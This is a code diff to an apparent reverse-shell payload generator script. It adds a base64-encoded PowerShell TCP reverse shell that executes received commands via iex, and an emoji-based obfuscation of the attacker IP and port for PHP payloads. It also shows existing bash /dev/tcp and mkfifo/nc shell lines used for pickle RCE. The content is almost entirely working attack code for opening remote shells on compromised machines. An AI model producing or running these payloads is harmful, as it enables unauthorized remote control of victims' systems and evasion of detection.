@@ -39,6 +39,36 @@ def load_shell():
 def base64gen(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('ascii'))
+	
+def base64gen_ps1(ip,port):
+	temp = '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'.replace("{IP}",ip).replace("{PORT}",port)
+	return base64.b64encode(temp.encode('UTF-16LE'))
+	
+def phpemoji(ip,port):
+	list_emoji = {
+		"0":"$🙂",
+		"1":"$😀",
+		"2":"$😁",
+		"3":"$😅",
+		"4":"$😆",
+		"5":"$😉",
+		"6":"$😊",
+		"7":"$😎",
+		"8":"$😍",
+		"9":"$😚",
+		".":"$🤔"
+	}
+	new_ip = ""
+	new_port = ""
+	#Retrieve New IP
+	for i in ip:
+		new_ip += list_emoji[i]
+		new_ip += "."
+	#Retrieve New Port
+	for i in port:
+		new_port += list_emoji[i]
+		new_port += "."
+	return new_ip[:-1],new_port[:-1]
 
 def pickle_rce(ip,port):
 	command = f'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port}' + ' >/tmp/f'
@@ -77,7 +107,8 @@ payload = {
 	"java":[],
 	"lua":[],
 	"asp": [],
-	"xxe": []
+	"xxe": [],
+	"jsp":[]
 }
 
 if __name__ == "__main__":
@@ -103,9 +134,15 @@ if __name__ == "__main__":
 		if "{BASE64}" in j:
 			temp = base64gen(ip,port)
 			print(j.strip().replace("{BASE64}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
+		elif "{BASE64PS1}" in j:
+			temp = base64gen_ps1(ip,port)
+			print(j.strip().replace("{BASE64PS1}",temp.decode("ascii")).replace("{IP}",ip).replace("{PORT}",port).strip())
 		elif "{PICKLE}" in j:
 			temp = pickle_rce(ip,port)
 			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
+		elif "{PHPEMOJI}" in j:
+			new_ip,new_port = phpemoji(ip,port)
+			print(j.strip().replace("{PHPEMOJI}","").replace("{IP}",new_ip).replace("{PORT}",new_port).strip())
 		elif "{NODEJS_DESERIALIZATION}" in j:
 			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
 			temp2 = char_encode(temp)
